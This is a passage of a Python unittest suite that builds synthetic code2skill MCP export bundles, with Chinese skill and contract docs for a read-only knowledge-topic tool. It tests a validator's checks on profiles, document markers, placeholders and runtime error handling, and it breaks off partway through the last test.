from __future__ import annotations

import hashlib
import json
import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = REPO_ROOT / "skills" / "code2skill-generate" / "scripts"
VALIDATOR = SCRIPTS / "validate_artifacts.py"
FINALIZER = SCRIPTS / "finalize_export.py"
DERIVER = SCRIPTS / "derive_artifacts.py"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))
import validate_artifacts as validator_module  # noqa: E402


def write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def install_document_contract_markers(candidate: Path, value: dict[str, object]) -> None:
    contract_path = candidate / "references/capability-contracts.json"
    write_json(contract_path, value)
    digest = hashlib.sha256(contract_path.read_bytes()).hexdigest()
    marker = f"<!-- code2skill-capability-contract-sha256:{digest} -->"
    evidence_ids = [
        item.get("evidenceId")
        for item in value.get("evidenceIndex", [])
        if isinstance(item, dict) and isinstance(item.get("evidenceId"), str)
    ]
    evidence_line = " ".join(f"`{item}`" for item in evidence_ids)
    for relative in ("SKILL.md", "MCP.zh-CN.md", "references/feature-context.md"):
        path = candidate / relative
        text = path.read_text(encoding="utf-8")
        text = re.sub(
            r"<!-- code2skill-capability-contract-sha256:[a-f0-9]{64} -->\n?",
            "",
            text,
        )
        path.write_text(
            text
            + f"\n\n{marker}\n\nMachine contract: `references/capability-contracts.json`."
            + (f"\n\nPrimary evidence: {evidence_line}." if evidence_line else "")
            + "\n",
            encoding="utf-8",
        )


def long_page() -> str:
    detail = "本段说明业务字段、只读边界、数据来源、停止条件和异常解释，帮助智能体选择最小能力集合。" * 3
    return f"""---
name: knowledge-search
title: 知识内容检索与主题查看页面说明
description: 说明用户如何浏览知识主题，并帮助智能体判断可调用的只读能力、数据来源、结果解释和停止条件。
route: /knowledge
language: zh-CN
---

# 知识内容检索页面

## 页面定位

这是一个只读页面，不会创建、修改、更新或删除任何业务数据。{detail}

## 典型用户目标

用户可以独立询问当前可用主题，也可以在后续功能中选择一个主题继续检索。{detail}

## 页面区域与业务信息

页面展示主题编码、中文标签和解释，不包含写入按钮。{detail}

## 动态依赖与失效规则

主题编码来自当前结果；上游版本变化后旧值失效，必须重新获取。{detail}

## 可用 MCP 能力

- `list_knowledge_topics`：无入参，只读返回主题列表，可以直接回答并结束。{detail}

## Agent 使用边界

这里只提供只读能力，不得创建、修改、更新、删除或写入内容。{detail}

## 不属于本页面的能力

发布、编辑和删除内容不属于本页面能力，Agent 不得声称可以执行。{detail}

## 推荐起点

用户询问主题时直接调用唯一只读 Tool，得到答案后停止。{detail}
"""


def long_feature_context() -> str:
    detail = "本段记录业务语义、可靠来源、动态失效条件、停止边界和异常解释；它只描述可由证据支持的事实，证据不足的内容必须保留为未知项，不能由生成器猜测补齐。" * 4
    return f"""# Feature Context：知识主题查询

## 业务目的

该功能帮助用户取得当前可用的知识主题目录，并理解每个主题代码的业务含义。它是一个完整业务功能而不是某个页面的操作说明。{detail}

## 参与者与权限

普通调用者可以读取公开主题目录；当前证据没有证明任何写权限。身份、租户和授权边界均应由真实服务判断。{detail}

## 领域概念与字段语义

主题代码是后续查询使用的稳定标识，中文标签用于向用户解释含义。目录来自当前能力结果，不得从一次观察样本冻结为永久枚举。{detail}

## 状态与业务规则

该能力只读，不会创建、修改、更新、删除或写入业务数据。目录版本或调用者上下文变化时，旧主题代码可能失效并需要重新获取。{detail}

## 原客户端行为

客户端在用户需要查看或选择知识主题时取得目录，再展示代码和中文标签。用户只询问目录时可以直接回答并停止，不强制继续后续流程。{detail}

## 结果与失败

成功结果包含主题集合；空集合需要如实说明。参数、网络、服务拒绝和响应结构错误必须保持可区分，不能把失败伪装成成功。{detail}

## 相关能力

- `list_knowledge_topics`：读取可靠主题目录，可以独立回答，也可以把主题代码交给后续能力。{detail}

## 未知项

当前合成证据没有证明写入、发布或删除能力，也没有证明目录在所有租户之间一致。相关能力不应被生成或声称可用。{detail}
"""


def mcp_setup() -> str:
    return """# Skill 安装与 MCP 运行设置

## 安装 Skill

从生成目录的上级工作区执行通用安装命令：

```bash
npx skills add ./generated/code2skill/knowledge-search -a consumer-agent -g -y
```

该命令只负责安装 Skill，使 Agent 可以发现使用知识；它不等于 MCP 已经启动或可以调用。

## 单独配置 MCP

MCP 启动、MCP 注册、认证以及环境变量必须由实际运行环境分别配置。使用 `node /opt/generated/knowledge-search/mcp-tool/index.mjs` 启动 stdio 服务，再将命令注册到 Host，注入真实鉴权信息和 `CODE2SKILL_DRY_RUN` 环境变量，最后通过 `tools/list` 与 `tools/call` 探测可用性。Skill 安装成功并不代表这些 MCP 配置已经完成。
"""


def long_skill() -> str:
    detail = "智能体必须根据用户已经提供的信息选择最小调用集合，核对字段来源，解释返回值，并在目标完成或证据不足时停止。" * 18
    return f"""---
name: knowledge-search
description: 当用户需要查看知识主题、理解主题代码含义或为后续检索收集可靠输入时，使用本技能选择只读工具并组织中文回答。
---

# 使用知识检索能力

## 定位与适用范围

本 Skill 是只读使用知识，不是固定脚本。详细业务背景按需读取 `references/feature-context.md`，不要把参考资料全部复制进当前上下文。{detail}

## 能力目录

### 查看主题 `list_knowledge_topics`

适用于用户询问有哪些知识主题或需要可靠主题代码时。输入为无入参空对象 `{{}}`；输出包含 `status`、`data` 和 `topics`，可直接回答并独立结束任务，也可把主题代码交接给下游。它是只读能力，不产生副作用。已经有仍然有效的主题代码时无需调用；用户目标与主题无关时不要调用。{detail}

## 输入与来源

此 Tool 无入参，调用时使用空对象。任何后续代码必须来源于返回的 `topics`，不能编造。{detail}

## 状态与交接

把 `data.topics[].code` 交接给下游 `topicCode`。当目录版本改变、会话来源改变或服务明确拒绝旧代码时，旧值失效并重新获取。{detail}

## 意图路由

只问主题就调用一次并停止；信息不足、目标歧义或多个候选无法选择时，先澄清并停止。{detail}

## 推荐组合

按需自由选择和组合能力，无需每次运行完整调用链。局部目标完成后立即结束。{detail}

## 自由组合边界

智能体可以灵活调用，但不必也不需要每次执行全部工具。缺少来源证据时停止，不能猜测。{detail}

## 输出组织

说明 `status`，从 `data` 中提取 `topics`，逐项展示代码和中文含义，不泄露内部实现。{detail}

## 失败分类与恢复

区分参数或 inputSchema 错误、来源 token 或 ID 失效、HTTP 网络超时断连、响应出参结构错误、空结果或 404。只读请求只有在明确未执行且策略允许时才可有限重试；不确定时停止。{detail}

## 安全与副作用

该能力只读。dry-run 或试运行必须在任何外部动作前返回；不得把密钥写入参数、日志或回答。{detail}

## 完整调用示例

### 示例一：直接列出主题

用户目标是查看主题。调用 `list_knowledge_topics`，参数为空对象；返回后停止条件是已获得 `topics`，回答代码与标签。

### 示例二：确认代码

用户请求确认某个主题代码。调用 `list_knowledge_topics` 后比较；停止条件是找到唯一匹配或报告不存在，输出核对结果。

### 示例三：为后续流程收集输入

用户目标是选择主题。调用 `list_knowledge_topics`，展示候选并等待用户选择；停止条件是需要用户决定，回答候选而不擅自继续。

{detail}

## Agent 自检清单

检查目标、来源、最小调用、`status`、`data`、`topics`、停止条件、只读边界、dry-run 和敏感信息。{detail}
"""


def long_mcp() -> str:
    detail = "调用方需要先检查入参契约，再读取出参中的状态与数据；协议错误和工具执行错误必须分开，任何失败都不能伪装成成功。还要说明调用时机、字段语义、结果交接、停止条件与恢复策略，避免把实现细节误当成业务事实。" * 42
    return f"""# 知识能力 MCP 中文契约

本服务使用 MCP 与 stdio，协议版本为 2025-11-25。客户端通过 tools/list 发现 name、title、description、inputSchema、outputSchema 和 annotations，通过 tools/call 调用。成功同时返回 content 与 structuredContent；执行失败设置 isError。dry-run 在外部动作之前短路。本文说明入参、出参、错误、示例和 handoff 交接。{detail}

## 主题目录 `list_knowledge_topics`

用途与调用时机：用户需要查看主题或取得可靠代码时调用。它是本地只读能力，执行 0 HTTP 请求，可独立调用和直接回答，也能把结果交给下游。入参为无入参空对象 `{{}}`。出参必须包含 `status`、`data` 和 `topics`。失败或结构错误作为 Tool Execution Error 返回 isError，不得交接无效结果。

调用示例：

```json
{{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{{"name":"list_knowledge_topics","arguments":{{}}}}}}
```

成功示例：

```json
{{"content":[{{"type":"text","text":"已返回主题"}}],"structuredContent":{{"status":"success","data":{{"topics":[{{"code":"guide","label":"指南"}}]}}}}}}
```

错误示例：

```json
{{"isError":true,"content":[{{"type":"text","text":"错误：输出结构不符合契约"}}],"structuredContent":{{"code":"INVALID_OUTPUT","message":"输出结构不符合契约","details":{{"path":"topics"}},"retryable":false}}}}
```

结构化错误固定说明 `code` 路径为 `code`、`message` 路径为 `message`、`details` 路径为 `details`、`retryable` 路径为 `retryable`；调用方据此判断应补充信息、停止还是在策略允许时重试。

{detail}
"""


def create_base(root: Path, *, write_side_effect: bool = False) -> Path:
    candidate = root / "knowledge-search"
    candidate.mkdir()
    profile = {
        "schemaVersion": "v1",
        "profile": "strict-export-v1",
        "protocolVersion": "2025-11-25",
        "transport": "stdio",
        "documentationLanguage": "zh-CN",
        "featureSurface": {"kind": "backend-api", "identifier": "knowledge-topics"},
        "pageRoute": "/knowledge",
        "allowedRuntimeOrigins": ["https://application.example"],
        "dryRunEnvironmentVariable": "CODE2SKILL_DRY_RUN",
    }
    bundle = {
        "schemaVersion": "v1",
        "recordingId": "knowledge-search-source-analysis",
        "server": {
            "name": "knowledge-capabilities",
            "description": "Knowledge discovery capabilities.",
            "evidenceRefs": ["src/knowledge.mjs#topics"],
        },
        "capabilities": [{
            "capabilityId": "list-knowledge-topics",
            "toolName": "list_knowledge_topics",
            "functionExport": "listKnowledgeTopics",
            "description": "List the topic catalog.",
            "authentication": "none",
            "annotations": {
                "readOnlyHint": True,
                "destructiveHint": False,
                "idempotentHint": True,
                "openWorldHint": False,
            },
            "inputs": [],
            "implementation": {"kind": "local"},
            "successRule": {
                "kind": "output",
                "outputRequired": True,
                "forbiddenOutputKeys": ["error"],
                "requiredOutputPaths": [["topics"]],
                "evidenceRefs": ["src/knowledge.mjs#topics"],
            },
            "sideEffect": "create" if write_side_effect else "read",
            "evidenceRefs": ["src/knowledge.mjs#topics"],
        }],
        "handoffs": [],
    }
    draft = {
        "schemaVersion": "v1",
        "recordingId": "knowledge-search-source-analysis",
        "status": "ready",
        "inputs": [],
        "provenance": [],
        "requestChain": [],
        "missingEvidence": [],
    }
    write_json(candidate / "export-profile.json", profile)
    write_json(candidate / "capability-bundle.json", bundle)
    write_json(candidate / "function-core/capability-bundle.json", bundle)
    write_json(candidate / "capability-draft.json", draft)
    (candidate / "function-core/index.mjs").write_text(
        "export async function listKnowledgeTopics(input, context = {}) { return {status: 'success', data: {topics: []}}; }\n",
        encoding="utf-8",
    )
    (candidate / "portable-error-normalizer.mjs").write_bytes(
        (
            REPO_ROOT
            / "skills/code2skill-generate/assets/portable-error-normalizer.mjs"
        ).read_bytes()
    )
    (candidate / "mcp-tool").mkdir()
    (candidate / "mcp-tool/runtime.mjs").write_text(
        "class McpServer {} class StdioServerTransport {} const z = {}; export { McpServer, StdioServerTransport, z };\n",
        encoding="utf-8",
    )
    (candidate / "mcp-tool/index.mjs").write_text(
        "import { McpServer, StdioServerTransport, z } from './runtime.mjs'; "
        "import { listKnowledgeTopics } from '../function-core/index.mjs'; "
        "import { normalizeToolError } from '../portable-error-normalizer.mjs'; "
        "const server = new McpServer({name: 'knowledge-capabilities', version: '1'}); "
        "server.registerTool('list_knowledge_topics', {"
        "title: '知识主题：列出可用主题', "
        "description: '面向需要查看知识主题的用户，用于在调用检索能力前读取可靠目录；本工具无入参，返回主题代码与中文标签，可用于直接回答并停止，也可作为可靠输入交给下游继续检索；它在本地执行，不产生任何 HTTP 请求，属于只读能力且没有写入副作用，失败时应停止。', "
        "inputSchema: {}, outputSchema: {}, annotations: {readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false}}, async (input, runtimeContext) => { "
        "if (process.env.CODE2SKILL_DRY_RUN === '1') { "
        "const dryRunResult = {dryRun: true, validatedInput: input, operationPolicy: {}, operationSummary: {}}; "
        "return {structuredContent: dryRunResult, content: [{type: 'text', text: JSON.stringify(dryRunResult)}], isError: false}; } "
        "try { const functionResult = await listKnowledgeTopics(input, runtimeContext); "
        "return {structuredContent: functionResult, content: [{type: 'text', text: JSON.stringify(functionResult)}], isError: false}; "
        "} catch (error) { const toolError = normalizeToolError(error, {}); "
        "return {structuredContent: toolError, content: [{type: 'text', text: JSON.stringify(toolError)}], isError: true}; } }); "
        "await server.connect(new StdioServerTransport());\n",
        encoding="utf-8",
    )
    (candidate / "PAGE.md").write_text(long_page(), encoding="utf-8")
    (candidate / "references").mkdir()
    (candidate / "references/feature-context.md").write_text(long_feature_context(), encoding="utf-8")
    (candidate / "MCP-SETUP.md").write_text(mcp_setup(), encoding="utf-8")
    (candidate / "SKILL.md").write_text(long_skill(), encoding="utf-8")
    (candidate / "MCP.zh-CN.md").write_text(long_mcp(), encoding="utf-8")
    install_document_contract_markers(candidate, {
        "schemaVersion": "vNext",
        "contractId": "synthetic-document-contract",
        "canonicalContractRef": "canonical-contract.json",
        "featureBoundary": {},
        "capabilities": bundle["capabilities"],
        "evidenceIndex": [],
    })
    return candidate


def vnext_capabilities(candidate: Path) -> dict[str, dict[str, object]]:
    bundle = json.loads((candidate / "capability-bundle.json").read_text(encoding="utf-8"))
    capability = bundle["capabilities"][0]
    capability["errorContract"] = {
        "format": "structured",
        "preservesRecoveryContext": True,
        "codePath": ["code"],
        "messagePath": ["message"],
        "detailsPath": ["details"],
        "retryabilityPath": ["retryable"],
        "defaultRetryable": False,
        "evidenceRefs": ["ev-fictional-error"],
    }
    return {capability["capabilityId"]: capability}


class StrictExportValidatorTest(unittest.TestCase):
    def run_validator(self, candidate: Path, *, pre_finalize: bool = True) -> subprocess.CompletedProcess[str]:
        command = [sys.executable, str(VALIDATOR), str(candidate)]
        if pre_finalize:
            command.append("--pre-finalize")
        return subprocess.run(command, check=False, capture_output=True, text=True)

    def test_valid_pre_finalization_bundle_passes(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            result = self.run_validator(candidate)
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertIn("1 capability/capabilities", result.stdout)

    def test_vnext_profile_uses_feature_surface_without_page_route(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_profile(profile, diagnostics, vnext=True)
            self.assertEqual(diagnostics.errors, [])

            profile.pop("featureSurface")
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_profile(profile, diagnostics, vnext=True)
            self.assertTrue(
                any("featureSurface" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_legacy_profile_still_requires_page_route(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_profile(profile, diagnostics, vnext=False)
            self.assertTrue(
                any("pageRoute" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_documents_use_feature_context_and_mcp_setup_without_page(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            (candidate / "PAGE.md").unlink()
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                profile,
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )
            self.assertEqual(diagnostics.errors, [])

    def test_vnext_documents_cannot_invert_canonical_requiredness(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            capabilities = vnext_capabilities(candidate)
            capability = next(iter(capabilities.values()))
            capability["inputs"] = [{
                "name": "value",
                "description": "Synthetic required value.",
                "type": "string",
                "schema": {"type": "string"},
                "required": True,
                "informationClass": "required",
                "sourceStrategies": ["user"],
                "valueDomain": {"kind": "unconstrained"},
                "requiredWhen": [],
                "forbiddenWhen": [],
                "freshness": {"refreshWhen": ["edited"]},
                "evidenceRefs": ["ev-fictional-input"],
            }]
            install_document_contract_markers(candidate, {
                "schemaVersion": "vNext",
                "contractId": "synthetic-document-contract",
                "canonicalContractRef": "canonical-contract.json",
                "featureBoundary": {},
                "capabilities": list(capabilities.values()),
                "evidenceIndex": [],
            })
            for relative in ("SKILL.md", "MCP.zh-CN.md"):
                path = candidate / relative
                path.write_text(
                    path.read_text(encoding="utf-8")
                    + "\nvalue 为可选字符串。\n",
                    encoding="utf-8",
                )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                profile,
                capabilities,
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("Canonically required" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_optional_upstream_value_requires_recommendation_without_becoming_required(self) -> None:
        capabilities = {
            "calculate-sample-value": {
                "capabilityId": "calculate-sample-value",
                "toolName": "calculate_sample_value",
                "inputs": [],
            },
            "submit-sample-request": {
                "capabilityId": "submit-sample-request",
                "toolName": "submit_sample_request",
                "inputs": [{
                    "name": "calculatedValue",
                    "required": False,
                    "requiredWhen": [],
                    "informationClass": "optional",
                    "sourceStrategies": [{
                        "kind": "upstream-tool",
                        "capabilityId": "calculate-sample-value",
                        "outputPath": ["value"],
                        "mappingKind": "direct",
                    }],
                    "targetRequiredness": {
                        "status": "unproven",
                        "normalProvider": {
                            "capabilityId": "calculate-sample-value",
                            "outputPath": ["value"],
                            "mappingKind": "direct",
                        },
                        "evidenceRefs": ["ev-client-normal-provider"],
                    },
                }],
            },
        }
        missing = validator_module.Diagnostics()
        validator_module._validate_optional_upstream_guidance(
            "`calculatedValue` 是可选输入。",
            capabilities,
            missing,
        )
        self.assertTrue(
            any("optional upstream-provided input" in item for item in missing.errors),
            missing.errors,
        )

        complete = validator_module.Diagnostics()
        validator_module._validate_optional_upstream_guidance(
            "正常流程建议先调用 `calculate_sample_value` 获得 `calculatedValue`；最终是否接受缺省值由目标后端决定。",
            capabilities,
            complete,
        )
        self.assertEqual(complete.errors, [])

        invalid_guidance = (
            "正常流程必须先调用 `calculate_sample_value` 获得 `calculatedValue`；最终是否接受缺省值由目标后端决定。",
            "正常流程务必先调用 `calculate_sample_value` 获得 `calculatedValue`；最终是否接受缺省值由目标后端决定。",
            "正常流程需要先调用 `calculate_sample_value` 获得 `calculatedValue`；最终是否接受缺省值由目标后端决定。",
            "只有先调用 `calculate_sample_value` 才能获得 `calculatedValue`；最终是否接受缺省值由目标后端决定。",
            "通常建议调用 `calculate_sample_value` 获得 `calculatedValue`；缺少时后端拒绝。",
        )
        for guidance in invalid_guidance:
            with self.subTest(guidance=guidance):
                mandatory = validator_module.Diagnostics()
                validator_module._validate_optional_upstream_guidance(
                    guidance,
                    capabilities,
                    mandatory,
                )
                self.assertTrue(
                    any("optional upstream-provided input" in item for item in mandatory.errors),
                    mandatory.errors,
                )

        capabilities["submit-sample-request"]["inputs"][0]["targetRequiredness"] = {
            "status": "proven-optional",
            "evidenceRefs": ["ev-contract-optional"],
        }
        proven_optional = validator_module.Diagnostics()
        validator_module._validate_optional_upstream_guidance(
            "`calculatedValue` 是源码明确允许省略的可选输入。",
            capabilities,
            proven_optional,
        )
        self.assertEqual(proven_optional.errors, [])

    def test_vnext_document_digest_must_follow_derived_contract(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            contract_path = candidate / "references/capability-contracts.json"
            contract = json.loads(contract_path.read_text(encoding="utf-8"))
            contract["contractId"] = "changed-without-reviewing-documents"
            write_json(contract_path, contract)
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                profile,
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("exact SHA-256 marker" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_feature_context_rejects_unresolved_template_content(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            context = candidate / "references/feature-context.md"
            context.write_text(
                context.read_text(encoding="utf-8")
                + "\n## 补充未知项\n\n<replace-with-source-facts>\n",
                encoding="utf-8",
            )
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            diagnostics = validator_module.Diagnostics()

            validator_module.validate_documents(
                candidate,
                profile,
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("template placeholder" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_attachment_package_setup_must_document_generic_resolution_boundary(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            capabilities = vnext_capabilities(candidate)
            next(iter(capabilities.values()))["hostRequirements"] = [
                "attachment-resolution"
            ]
            diagnostics = validator_module.Diagnostics()

            validator_module.validate_documents(
                candidate,
                profile,
                capabilities,
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("attachment-resolution integration" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_base_files_replace_page_with_context_and_setup(self) -> None:
        self.assertNotIn("PAGE.md", validator_module.VNEXT_BASE_FILES)
        self.assertIn("references/feature-context.md", validator_module.VNEXT_BASE_FILES)
        self.assertIn("references/capability-contracts.json", validator_module.VNEXT_BASE_FILES)
        self.assertIn("MCP-SETUP.md", validator_module.VNEXT_BASE_FILES)
        self.assertIn("PAGE.md", validator_module.LEGACY_BASE_FILES)

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = create_base(root)
            write_json(candidate / "canonical-contract.json", {})
            write_json(candidate / "function-core/schema-contract.json", {})
            write_json(candidate / "mcp-tool/schema-contract.json", {})
            (candidate / "PAGE.md").unlink()
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile.pop("pageRoute")
            profile["allowedRuntimeOrigins"] = []
            write_json(candidate / "export-profile.json", profile)
            diagnostics = validator_module.Diagnostics()
            with (
                mock.patch.object(validator_module, "validate_draft"),
                mock.patch.object(validator_module, "validate_vnext_artifacts"),
            ):
                bundle = validator_module.validate(
                    candidate,
                    root,
                    True,
                    diagnostics,
                )
            self.assertIsNotNone(bundle)
            self.assertEqual(diagnostics.errors, [])

    def test_vnext_skill_frontmatter_follows_agent_skills_basics(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            skill = candidate / "SKILL.md"
            skill.write_text(
                skill.read_text(encoding="utf-8").replace(
                    "name: knowledge-search",
                    "name: Use_Knowledge_Search",
                    1,
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                json.loads((candidate / "export-profile.json").read_text(encoding="utf-8")),
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )
            self.assertTrue(
                any("frontmatter name" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_skill_description_has_agent_skills_length_limit(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            skill = candidate / "SKILL.md"
            skill.write_text(
                skill.read_text(encoding="utf-8").replace(
                    "description: 当用户需要查看知识主题、理解主题代码含义或为后续检索收集可靠输入时，使用本技能选择只读工具并组织中文回答。",
                    f"description: {'长' * 1025}",
                    1,
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                json.loads((candidate / "export-profile.json").read_text(encoding="utf-8")),
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )
            self.assertTrue(
                any("description must contain 1-1024" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_mcp_setup_separates_skill_install_from_runtime(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            setup = candidate / "MCP-SETUP.md"
            setup.write_text(
                setup.read_text(encoding="utf-8").replace(" -a consumer-agent", ""),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                json.loads((candidate / "export-profile.json").read_text(encoding="utf-8")),
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )
            self.assertTrue(
                any("Agent selector" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_mcp_setup_rejects_unresolved_placeholders_and_profile_drift(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            setup = candidate / "MCP-SETUP.md"
            setup.write_text(
                setup.read_text(encoding="utf-8")
                .replace("knowledge-search", "<feature-id>", 1)
                .replace("CODE2SKILL_DRY_RUN", "DIFFERENT_DRY_RUN"),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                json.loads((candidate / "export-profile.json").read_text(encoding="utf-8")),
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("template placeholders" in item for item in diagnostics.errors),
            diagnostics.errors,
        )
        self.assertTrue(
            any("exact export-profile dry-run" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_mcp_docs_cover_structured_error_contract_paths(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            mcp = candidate / "MCP.zh-CN.md"
            mcp.write_text(
                mcp.read_text(encoding="utf-8").replace("`retryable`", "`canRetry`"),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_documents(
                candidate,
                json.loads((candidate / "export-profile.json").read_text(encoding="utf-8")),
                vnext_capabilities(candidate),
                diagnostics,
                vnext=True,
            )
            self.assertTrue(
                any("structured error path `retryable`" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_runtime_exposes_structured_error_fields(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            normalizer = candidate / "portable-error-normalizer.mjs"
            normalizer.write_text(
                re.sub(
                    r"\bretryable\b",
                    "canRetry",
                    normalizer.read_text(encoding="utf-8"),
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
            self.assertTrue(
                any("structured error field `retryable`" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_runtime_keeps_legacy_reviewed_normalizer_compatible(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            normalizer = candidate / "portable-error-normalizer.mjs"
            current = normalizer.read_text(encoding="utf-8")
            legacy = re.sub(
                r"\nexport function toMcpResult\(value, isError = false\) \{.*?\n\}\n\n",
                "\n",
                current,
                count=1,
                flags=re.DOTALL,
            )
            self.assertEqual(
                hashlib.sha256(legacy.encode("utf-8")).hexdigest(),
                validator_module.LEGACY_REVIEWED_NORMALIZER_SHA256,
            )
            normalizer.write_text(legacy, encoding="utf-8")
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
            self.assertFalse(
                any("byte-exact reviewed" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

    def test_vnext_callback_requires_strict_structured_error_projection(self) -> None:
        mutations = (
            (
                "const toolError = normalizeToolError(error, {});",
                "const toolError = error;",
            ),
            (
                "structuredContent: toolError",
                "structuredContent: error",
            ),
            (
                "isError: true",
                "isError: false",
            ),
            (
                "catch (error)",
                "catch (ignored)",
            ),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement, 1),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("exact try/success projection/catch" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_tool_callback_must_call_its_matching_function_export(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            runtime = candidate / "mcp-tool/index.mjs"
            runtime.write_text(
                runtime.read_text(encoding="utf-8").replace(
                    "await listKnowledgeTopics(input, runtimeContext)",
                    "await swappedFunction(input, runtimeContext)",
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("must call exactly its Canonical Function export" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_runtime_origins_are_exact_and_reject_credentials(self) -> None:
        canonical = {
            "capabilities": [{
                "capabilityId": "list-knowledge-topics",
                "annotations": {"openWorldHint": True},
                "implementation": {
                    "kind": "http",
                    "steps": [{"url": "https://application.example/api/topics"}],
                },
            }],
        }
